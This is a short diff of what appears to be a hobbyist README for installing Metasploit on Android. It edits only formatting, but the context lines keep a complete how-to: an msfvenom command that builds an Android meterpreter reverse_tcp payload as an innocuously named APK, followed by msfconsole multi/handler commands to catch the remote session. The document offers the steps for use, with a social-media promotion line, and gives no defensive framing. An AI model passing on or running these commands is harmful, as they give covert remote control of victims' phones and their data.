@@ -7,10 +7,11 @@
      cd Metasploit
      bash Exploit.sh
 
-     After Install Metasploit Use This Cmd For Make App
+     After Install Metasploit Use This Cmd For Make App👇
+
      msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=15181 R >/sdcard/BaapG.apk
 
-     After Install Apk Use This Cmd
+     After Install Apk Use This Cmd👇
 
      msfconsole
      use exploit/multi/handler
@@ -19,7 +20,7 @@
      set LPORT 4444
      exploit
 
-     Follow Me @krish_na_2568
+     Follow Me @krish_na_2568 ☝
 
 
 Metasploit
